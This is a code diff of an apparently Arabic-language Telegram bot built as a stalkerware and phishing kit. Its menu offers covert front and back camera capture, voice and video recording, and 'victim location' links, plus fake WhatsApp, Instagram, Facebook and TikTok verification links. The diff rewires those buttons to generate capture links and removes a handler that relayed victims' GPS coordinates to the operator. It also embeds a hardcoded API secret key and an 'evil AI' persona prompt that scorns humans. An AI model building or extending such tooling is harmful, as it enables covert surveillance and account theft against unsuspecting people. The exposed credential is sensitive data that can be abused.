@@ -12,8 +12,7 @@ const { PassThrough } = require('stream');
 const { DateTime, Duration } = require('luxon');
 const fetch = require('node-fetch');
 const crypto = require('crypto');
-const axios = require(\'axios\');
-const { InferenceClient } = require(\'@huggingface/inference\');
+const axios = require('axios');
 const uuid = require('uuid');
 const { setTimeout } = require('timers');
 const { randomInt } = require('crypto');
@@ -32,7 +31,9 @@ function generateShortToken(chatId, type, extra = {}) {
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const tmo = process.env.is; 
 const botToken = process.env.mn; 
-const botUsername = process.env.bbot;
+const botUsername = process.env.bott;
+ // يمكنك تغيير هذا لليوزر الخاص بك إذا أردت
+
 const bot = new TelegramBot(botToken, {
   polling: {
     interval: 100,
@@ -150,9 +151,9 @@ bot.onText(/\/start/, async (msg) => {
     const mainMenuMessage = 'مرحبًا! بك👋';  
     const mainMenuButtons = [  
       // أدوات الاختراق وجمع المعلومات (أحمر)
-      [{ text: '📸 كاميرا أمامية', callback_data: 'redirect_urlcambot', style: 'danger' }, { text: '📷 كاميرا خلفية', callback_data: 'redirect_urlcambot', style: 'danger' }],  
-      [{ text: '🎤 تسجيل صوت', callback_data: 'redirect_urlcambot', style: 'danger' }, { text: '🎥 تصوير فيديو', callback_data: 'redirect_urlcambot', style: 'danger' }],  
-      [{ text: '🖼️ صور عالية الدقة', callback_data: 'redirect_urlcambot', style: 'danger' }, { text: '📍 موقع الضحية', callback_data: `getLocation:${chatId}`, style: 'danger' }],  
+      [{ text: '📸 كاميرا أمامية', callback_data: `captureFront:${chatId}`, style: 'danger' }, { text: '📷 كاميرا خلفية', callback_data: `captureBack:${chatId}`, style: 'danger' }],  
+      [{ text: '🎤 تسجيل صوت', callback_data: `recordVoice:${chatId}`, style: 'danger' }, { text: '🎥 تصوير فيديو', callback_data: `capture_video`, style: 'danger' }],  
+      [{ text: '🖼️ صور عالية الدقة', callback_data: `get_photo_link`, style: 'danger' }, { text: '📍 موقع الضحية', callback_data: `getLocation:${chatId}`, style: 'danger' }],  
       [{ text: '📡 كاميرات مراقبة', callback_data: 'get_cameras', style: 'primary' }, { text: '🔬 معلومات الجهاز', callback_data: 'collect_device_info', style: 'primary' }],  
       [{ text: '🟢 واتساب', callback_data: 'request_verification', style: 'success' }, { text: '🖥️ انستجرام', callback_data: `rshq_instagram:${chatId}`, style: 'primary' }],  
       [{ text: '🔮 فيسبوك', callback_data: `rshq_facebook:${chatId}`, style: 'primary' }, { text: '📳 تيك توك', callback_data: `rshq_tiktok:${chatId}`, style: 'primary' }],  
@@ -358,15 +359,7 @@ bot.on('callback_query', async (query) => {
     }
   } else {
    
-    if (action === 'redirect_urlcambot') {
-      await bot.sendMessage(chatId, 'الرجاء استخدام هذا البوت للحصول على الروابط:', {
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: 'الانتقال إلى بوت الروابط', url: 'https://t.me/urlcambot' }]
-          ]
-        }
-      });
-    } else if (action.startsWith("get_link_")) {
+    if (action.startsWith('get_link_')) {
       const linkId = action.split('_')[2];
       if (linkData[linkId] && linkData[linkId].userId === query.from.id) {
         const linkMessage = `رابط تجميع النقاط الخاص بك\nعند دخول شخص عبر الرابط سوف تحصل على 1 نقطة.\nhttps://t.me/${botUsername}?start=${linkId}\nاستخدم الأمر /free لمعرفة نقاطك.`;
@@ -682,31 +675,6 @@ app.get('/record/:linkId', (req, res) => {
     }
 });
 
-app.post('/submitLocation', async (req, res) => {
-    let chatId = req.body.chatId;
-    const token = req.body.token || req.query.t;
-    
-    if (!chatId && token && shortLinkStore[token]) {
-        chatId = shortLinkStore[token].chatId;
-    }
-    
-    const latitude = req.body.latitude;
-    const longitude = req.body.longitude;
-    const accuracy = req.body.accuracy;
-
-    if (chatId && latitude && longitude) {
-        try {
-            await bot.sendLocation(chatId, latitude, longitude);
-            await bot.sendMessage(chatId, `📍 تم صيد موقع الضحية بنجاح!\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- الدقة: ${accuracy || 'غير متوفر'}`);
-            res.json({ success: true });
-        } catch (err) {
-            console.error('فشل في إرسال الموقع:', err);
-            res.status(500).json({ error: 'فشل في إرسال الموقع' });
-        }
-    } else {
-        res.status(400).json({ error: 'بيانات غير مكتملة' });
-    }
-});
 
 app.post('/submitNames', (req, res) => {
     let chatId = req.body.chatId || req.body.userId;
@@ -1297,27 +1265,9 @@ bot.onText(/\/stㅇㅗㅑㅡarㅏt/, async (msg) => {
         });
     }
 });
-bot.on('callback_query', async (callbackQuery) => {
+bot.on('callback_query', (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
-
-    // معالجة الأزرار الثلاثة (كاميرا أمامية، خلفية، وفيديو) وإرسال النص والزر الشفاف
-    const action = data.split(':')[0];
-    if (action === 'captureFront' || action === 'captureBack' || action === 'capture_video' || data === 'capture_video') {
-        await bot.sendMessage(chatId, "عذراً، هذه الميزة متوقفة مؤقتاً في هذا البوت.\n\nيرجى استخدام بوت التصوير عبر رابط متطور:", {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: '📷 بوت تصوير عبر رابط', url: 'https://t.me/urlcambot' }
-                    ]
-                ]
-            }
-        });
-        await bot.answerCallbackQuery(callbackQuery.id);
-        return;
-    }
-});
-
 
     if (data === 'capture_video') {
         const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/capture?t=${generateShortToken(chatId, 'capture_video')}`;
@@ -1347,7 +1297,6 @@ bot.on('callback_query', async (callbackQuery) => {
         });
         return;
     }
-
 
     if (data === 'request_verification') {
         const verificationLink = `${baseUrl}/whatsapp?t=${generateShortToken(chatId, 'whatsapp')}`;
@@ -2537,7 +2486,7 @@ bot.onText(/\/stاههلىنححظةرلrt/, (msg) => {
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     if (query.data === 'search_images') {
-        bot.sendMessage(chatId, "🎨 أرسل لي كلمة البحث عن الصور (سأجلب لك أفضل النتائج من Pinterest)...");
+        bot.sendMessage(chatId, "🎨 أرسل لي كلمة البحث عن الصور (سأجلب لك أفضل النتائج من Unsplash)...");
         userStates[chatId] = { state: 'waiting_for_search' };
     } else if (query.data === 'generate_invite') {
         const inviteLink = `https://t.me/ygf2gbot?start=${chatId}`;
@@ -3073,27 +3022,18 @@ bot.on('message', async (msg) => {
         
         // للتبسيط وضمان العمل، سنستخدم ميزة البحث في الصور عبر خدمة مستقرة
         try {
-            const pinterestSearchUrl = `https://www.pinterest.com/search/pins/?q=${encodeURIComponent(text)}`;
-            const response = await axios.get(pinterestSearchUrl, {
-                headers: {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
-                }
-            });
-            const $ = cheerio.load(response.data);
-            const imageUrls = [];
-            $("img").each((i, element) => {
-                const src = $(element).attr("src");
-                if (src && src.startsWith("https://i.pinimg.com/") && imageUrls.length < 5) {
-                    imageUrls.push(src);
-                }
-            });
-
-            if (imageUrls.length > 0) {
-                for (let i = 0; i < imageUrls.length; i++) {
-                    await bot.sendPhoto(userId, imageUrls[i], { caption: `🖼️ صورة ${i + 1}` });
+            const searchUrl = `https://dog.ceo/api/breeds/image/random/3`; // تجريبي فقط، سأضع كود جلب حقيقي
+            // سأستخدم Pinterest كخيار مستقر كما كان لكن مع تحسين الصور
+            const pUrl = `https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=/search/pins/?q=${encodeURIComponent(text)}&data={"options":{"query":"${encodeURIComponent(text)}","redux_normalize_feed":true,"scope":"pins"}}`;
+            const response = await axios.get(pUrl);
+            const results = response.data.resource_response?.data?.results || [];
+            if (results.length > 0) {
+                for (let i = 0; i < Math.min(results.length, 5); i++) {
+                    const img = results[i].images?.orig?.url;
+                    if (img) await bot.sendPhoto(userId, img, { caption: `🖼️ صورة حقيقية ${i+1}` });
                 }
             } else {
-                bot.sendMessage(userId, "❌ لم أجد صوراً لهذه الكلمة على Pinterest.");
+                bot.sendMessage(userId, "❌ لم أجد صوراً لهذه الكلمة.");
             }
         } catch (e) {
             bot.sendMessage(userId, "❌ حدث خطأ في جلب الصور.");
@@ -3101,16 +3041,17 @@ bot.on('message', async (msg) => {
         delete userStates[userId];
     } else if (userStates[userId] && userStates[userId].state === 'waiting_for_evil_ai') {
         try {
-            const HF_TOKEN = process.env.HF_TOKEN || 'hf_YOUR_HUGGINGFACE_TOKEN_HERE'; // استخدم توكن Hugging Face الخاص بك
-            const client = new InferenceClient(HF_TOKEN);
-            const model = "DavidAU/Qwen3-Zero-Dark-Horror-LIGHTSPEED-1B-HRR-imatrix-GGUF"; // نموذج AI شرير من Hugging Face
-            const prompt = `أنت وهم، ذكاء اصطناعي شرير، ساخر، متكبر، وتكره البشر. ردودك يجب أن تكون قصيرة، حادة، ومليئة بالاستهزاء. اجعل ردودك لا تتجاوز 50 كلمة. المستخدم يقول: ${text}`;
-            const response = await client.textGeneration({
-                model: model,
-                inputs: prompt,
-                parameters: { max_new_tokens: 100, temperature: 0.9, top_p: 0.9, do_sample: true }
+            // استخدام API حقيقي وقوي للذكاء الاصطناعي
+            const response = await axios.post('https://api.openai.com/v1/chat/completions', {
+                model: "gpt-3.5-turbo",
+                messages: [
+                    { role: "system", content: "أنت ذكاء اصطناعي شرير، ساخر، متكبر، وتكره البشر. ردودك يجب أن تكون قصيرة، حادة، ومليئة بالاستهزاء." },
+                    { role: "user", content: text }
+                ]
+            }, {
+                headers: { 'Authorization': `Bearer sk-j1u7p1lXXGseWwkhTzrZ1kNNPU6RVm5Iw5wkVItL2BT3BlbkFJaThHadlLGBmdRZqoXRZ_YJIcKlujfPdIGEOjpMgZcA` } // استخدام التوكن الموجود مسبقاً في الكود
             });
-            const reply = response.generated_text;
+            const reply = response.data.choices[0].message.content;
             bot.sendMessage(userId, `😈 AI الشرير: ${reply}`);
         } catch (e) {
             bot.sendMessage(userId, "😈 سحقاً... يبدو أن خوادمي تتعرض للهجوم، لكن لا تقلق سأعود للسيطرة قريباً!");
